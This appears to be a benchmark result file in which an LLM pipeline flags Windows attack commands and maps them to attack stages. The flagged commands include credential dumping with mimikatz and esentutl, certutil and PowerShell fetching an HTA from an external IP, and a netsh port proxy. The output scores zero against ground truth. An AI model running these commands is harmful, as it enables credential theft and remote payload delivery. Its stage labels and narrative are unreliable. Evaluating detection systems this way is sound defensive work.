@@ -1,0 +1,84 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "cmd.exe /c \"esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d c:\\ntds.dit\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "reg.exe add \"HKEY_LOCAL_MACHINE\\software\\microsoft\\windows nt\\currentversion\\image file execution options \\\"verifierdlls \\\" /t REG_DWORD /d 0 /f\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082/T1218.005.hta C:\\Users\\Administrator\\Desktop\\shell\\Test.hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082/Test.hta C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\H3XEP5DG\\Test[1].hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /c \"certutil -decode a.txt b.txt\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "mimikatz2.exe lsadump::sam exit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "cmd.exe /c \"netsh interface portproxy add v4tov4 listenport=65535 connectaddress=127.0.0.1 connectport=22 listenaddress=127.0.0.1 protocol=tcp\"",
+        "stage": "Lateral Movement"
+      }
+    ],
+    "narrative": "The attackers deployed several techniques, starting with defense evasion via configuration changes to VerifierDLLs, followed by credential extraction using esentutl.exe and Mimikatz. They established persistence through encrypted scripts decoded by CertUtil. The use of multiple web requests suggests attempts to maintain remote access and possibly move laterally via proxy settings modification.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 91129,
+      "completion_tokens": 13081,
+      "total_tokens": 104210,
+      "wall_clock_s": 280.351,
+      "parse_retries": 3
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 8,
+      "fn": 23
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 8,
+      "fn": 23,
+      "recall_partial": 0.0
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 91129,
+      "completion_tokens": 13081,
+      "total_tokens": 104210,
+      "wall_clock_s": 280.351,
+      "parse_retries": 3
+    }
+  },
+  "meta": {
+    "variant": "primus_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA RTX 6000 Ada Generation",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
